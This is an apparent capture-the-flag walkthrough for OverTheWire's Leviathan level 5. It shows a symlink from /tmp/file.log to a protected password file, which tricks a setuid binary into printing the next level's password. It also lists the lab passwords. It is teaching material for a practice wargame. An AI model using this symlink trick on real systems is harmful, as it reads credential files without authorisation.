# Leviathan Level 5 

## 🧠 Goal  

Log into Leviathan 5 and find the password for Leviathan 6.  

---

## 🔐 Credentials  

- **Username:** `leviathan5`  
- **Host:** `leviathan.labs.overthewire.org`  
- **Port:** `2223` (SSH)  
- **Password:** `0dyxT7F4QD`  

---

## 🖥️ Commands Used  

```bash
# connect to leviathan5
ssh leviathan5@leviathan.labs.overthewire.org -p 2223

leviathan5@leviathan:~$ ls -l
total 16
-r-sr-x--- 1 leviathan6 leviathan5 15144 Aug 15 13:17 leviathan5
leviathan5@leviathan:~$ ltrace ./leviathan5
__libc_start_main(0x804910d, 1, 0xffffd464, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                             = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                       = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
leviathan5@leviathan:~$ ./leviathan5
Cannot find /tmp/file.log
# create a symbolic link : pointer to another file , doesn`t point to the data itself but to the path of the file (like shortcut)
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ls -l /tmp/file.log
lrwxrwxrwx 1 leviathan5 leviathan5 30 Sep 18 11:57 /tmp/file.log -> /etc/leviathan_pass/leviathan6
leviathan5@leviathan:~$ ./leviathan5
szo7HDB88w

```
___

## 💡 Theory
```bash
# create a symbolic link : pointer to another file , doesn`t point to the data itself but to the path of the file (like shortcut)
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
```
___

## 📤 Output
```bash
szo7HDB88w
```
